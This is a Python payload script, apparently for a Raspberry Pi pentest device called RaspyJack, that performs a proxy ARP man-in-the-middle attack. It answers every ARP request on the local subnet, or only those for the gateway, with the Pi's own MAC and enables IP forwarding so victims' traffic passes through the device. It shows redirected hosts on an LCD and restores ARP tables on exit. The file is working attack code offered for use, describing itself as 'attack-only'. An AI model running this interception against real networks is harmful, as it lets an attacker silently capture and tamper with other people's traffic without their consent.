#!/usr/bin/env python3
"""
RaspyJack Payload -- Proxy ARP
================================
Author: 7h30th3r0n3

Proxy ARP — respond to all ARP requests for a subnet with the Pi's MAC.
All hosts then send their traffic through the Pi instead of the real gateway.
IP forwarding relays traffic transparently.

Flow:
  1) Detect subnet and gateway
  2) Answer every ARP who-has with Pi's MAC
  3) Enable IP forwarding to relay transparently
  4) Track redirected hosts and traffic volume

Controls:
  OK        -- Start / stop proxy ARP
  UP / DOWN -- Scroll redirected hosts
  KEY1      -- Toggle selective mode (specific IPs only)
  KEY3      -- Exit + restore normal ARP

Loot: None (attack-only — stateful MITM).

Setup: Enable IP forwarding.
"""

import os
import sys
import time
import json
import threading
import subprocess
import re
from datetime import datetime
from collections import defaultdict

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44
import LCD_Config
from PIL import Image, ImageDraw, ImageFont
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button

try:
    from scapy.all import (
        sniff, sendp, ARP, Ether, conf,
    )
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False

PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = LCD.width, LCD.height
font = scaled_font()

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
ROWS_VISIBLE = 6

# ---------------------------------------------------------------------------
# Shared state
# ---------------------------------------------------------------------------
lock = threading.Lock()
status_msg = "Ready"
scroll_pos = 0
proxy_active = False
selective_mode = False
selective_ips = set()        # IPs to proxy in selective mode
app_running = True

arp_answered = 0
redirected_hosts = defaultdict(int)   # IP -> request count
traffic_bytes = 0

my_iface = ""
my_mac = ""
my_ip = ""
gateway_ip = ""
gateway_mac = ""
subnet = ""


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _run_cmd(cmd, timeout=10):
    try:
        return subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
    except Exception:
        return None


def _get_default_iface():
    try:
        r = _run_cmd(["ip", "route", "show", "default"])
        for line in r.stdout.splitlines():
            parts = line.split()
            if "dev" in parts:
                return parts[parts.index("dev") + 1]
    except Exception:
        pass
    return "eth0"


def _get_gateway_ip():
    try:
        r = _run_cmd(["ip", "route", "show", "default"])
        for line in r.stdout.splitlines():
            parts = line.split()
            if "via" in parts:
                return parts[parts.index("via") + 1]
    except Exception:
        pass
    return ""


def _get_iface_ip(iface):
    try:
        r = _run_cmd(["ip", "-4", "addr", "show", "dev", iface])
        for line in r.stdout.splitlines():
            line = line.strip()
            if line.startswith("inet "):
                return line.split()[1].split("/")[0]
    except Exception:
        pass
    return ""


def _get_iface_mac(iface):
    try:
        with open(f"/sys/class/net/{iface}/address") as fh:
            return fh.read().strip()
    except Exception:
        return ""


def _get_subnet(iface):
    try:
        r = _run_cmd(["ip", "-4", "addr", "show", "dev", iface])
        for line in r.stdout.splitlines():
            line = line.strip()
            if line.startswith("inet "):
                return line.split()[1]
    except Exception:
        pass
    return ""


def _resolve_mac(ip):
    try:
        r = _run_cmd(["arp", "-n", ip])
        match = re.search(r"([0-9a-f:]{17})", r.stdout, re.I)
        if match:
            return match.group(1).lower()
    except Exception:
        pass
    return ""


def _enable_ip_forward():
    _run_cmd(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"])


def _disable_ip_forward():
    _run_cmd(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=0"])


# ---------------------------------------------------------------------------
# Proxy ARP engine
# ---------------------------------------------------------------------------

def _arp_handler(pkt):
    """Respond to ARP who-has requests."""
    global arp_answered

    if not pkt.haslayer(ARP):
        return
    arp = pkt[ARP]

    # Only handle ARP requests (op=1 = who-has)
    if arp.op != 1:
        return

    requested_ip = arp.pdst
    requester_ip = arp.psrc
    requester_mac = arp.hwsrc

    # Don't respond to our own requests
    if requester_ip == my_ip:
        return

    # Don't proxy for our own IP
    if requested_ip == my_ip:
        return

    # In selective mode, only proxy specific IPs
    if selective_mode and requested_ip not in selective_ips:
        return

    # Send ARP reply: requested_ip is-at my_mac
    try:
        reply = (
            Ether(src=my_mac, dst=requester_mac)
            / ARP(
                op=2,  # is-at
                hwsrc=my_mac,
                psrc=requested_ip,
                hwdst=requester_mac,
                pdst=requester_ip,
            )
        )
        sendp(reply, iface=my_iface, verbose=False)
        with lock:
            arp_answered += 1
            redirected_hosts[requester_ip] += 1
    except Exception:
        pass


def _proxy_thread():
    """Sniff ARP and respond."""
    global proxy_active, status_msg
    proxy_active = True
    _enable_ip_forward()
    with lock:
        status_msg = "Proxy ARP active"
    try:
        sniff(
            filter="arp",
            prn=_arp_handler,
            store=False,
            iface=my_iface,
            stop_filter=lambda _: not app_running or not proxy_active,
        )
    except Exception as exc:
        with lock:
            status_msg = f"Err: {exc}"
    finally:
        proxy_active = False


def _restore_arp():
    """Send gratuitous ARPs to restore correct gateway MAC."""
    global status_msg
    if not gateway_ip or not gateway_mac:
        return
    with lock:
        status_msg = "Restoring ARP..."
    try:
        # Broadcast correct gateway ARP
        for _ in range(5):
            restore = (
                Ether(src=gateway_mac, dst="ff:ff:ff:ff:ff:ff")
                / ARP(
                    op=2,
                    hwsrc=gateway_mac,
                    psrc=gateway_ip,
                    hwdst="ff:ff:ff:ff:ff:ff",
                    pdst=gateway_ip,
                )
            )
            sendp(restore, iface=my_iface, verbose=False)
            time.sleep(0.5)
    except Exception:
        pass


# ---------------------------------------------------------------------------
# LCD rendering
# ---------------------------------------------------------------------------

def _draw_screen():
    img = Image.new("RGB", (WIDTH, HEIGHT), "BLACK")
    draw = ScaledDraw(img)
    draw.text((2, 2), "PROXY ARP", fill="CYAN", font=font)

    with lock:
        st = status_msg
        aa = arp_answered
        rh = dict(redirected_hosts)
        sp = scroll_pos
        pa = proxy_active
        sm = selective_mode

    indicator = "ON" if pa else "OFF"
    ind_color = "GREEN" if pa else "RED"
    draw.text((90, 2), indicator, fill=ind_color, font=font)

    mode = "SELECT" if sm else "ALL"
    draw.text((2, 14), f"ARP:{aa} Mode:{mode}", fill="WHITE", font=font)

    y = 28
    host_list = sorted(rh.items(), key=lambda x: x[1], reverse=True)
    for ip, cnt in host_list[sp:sp + ROWS_VISIBLE]:
        draw.text((2, y), f"{ip:<15} {cnt:>4}", fill="GREEN", font=font)
        y += 14

    if not host_list:
        draw.text((2, 56), "No hosts redirected", fill="GRAY", font=font)

    draw.text((2, 100), f"GW: {gateway_ip}", fill="GRAY", font=font)
    draw.text((2, 116), "OK=go K1=sel K3=exit", fill="GRAY", font=font)
    LCD.LCD_ShowImage(img, 0, 0)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    global app_running, proxy_active, selective_mode, scroll_pos
    global status_msg, my_iface, my_mac, my_ip, gateway_ip, gateway_mac, subnet

    if not SCAPY_OK:
        img = Image.new("RGB", (WIDTH, HEIGHT), "BLACK")
        d = ScaledDraw(img)
        d.text((4, 50), "scapy not found!", font=font, fill="RED")
        LCD.LCD_ShowImage(img, 0, 0)
        time.sleep(3)
        GPIO.cleanup()
        return

    my_iface = _get_default_iface()
    my_mac = _get_iface_mac(my_iface)
    my_ip = _get_iface_ip(my_iface)
    gateway_ip = _get_gateway_ip()
    gateway_mac = _resolve_mac(gateway_ip) if gateway_ip else ""
    subnet = _get_subnet(my_iface)

    with lock:
        status_msg = f"Ready on {my_iface}"

    try:
        _draw_screen()

        while app_running:
            btn = get_button(PINS, GPIO)

            if btn == "KEY3":
                app_running = False
                break

            elif btn == "OK":
                if not proxy_active:
                    threading.Thread(target=_proxy_thread, daemon=True).start()
                else:
                    proxy_active = False
                    _disable_ip_forward()
                    threading.Thread(target=_restore_arp, daemon=True).start()

            elif btn == "UP":
                with lock:
                    if scroll_pos > 0:
                        scroll_pos -= 1

            elif btn == "DOWN":
                with lock:
                    max_s = max(0, len(redirected_hosts) - ROWS_VISIBLE)
                    if scroll_pos < max_s:
                        scroll_pos += 1

            elif btn == "KEY1":
                selective_mode = not selective_mode
                if selective_mode:
                    # In selective mode, only proxy for gateway IP
                    selective_ips.clear()
                    if gateway_ip:
                        selective_ips.add(gateway_ip)
                    with lock:
                        status_msg = "Selective: GW only"
                else:
                    with lock:
                        status_msg = "All subnet mode"

            _draw_screen()
            time.sleep(0.15)

    finally:
        app_running = False
        if proxy_active:
            proxy_active = False
            _disable_ip_forward()
            _restore_arp()
        try:
            img = Image.new("RGB", (WIDTH, HEIGHT), "BLACK")
            d = ScaledDraw(img)
            d.text((10, 50), "ARP restored", fill="YELLOW", font=font)
            d.text((10, 66), "Proxy stopped", fill="RED", font=font)
            LCD.LCD_ShowImage(img, 0, 0)
        except Exception:
            pass
        GPIO.cleanup()


if __name__ == "__main__":
    main()
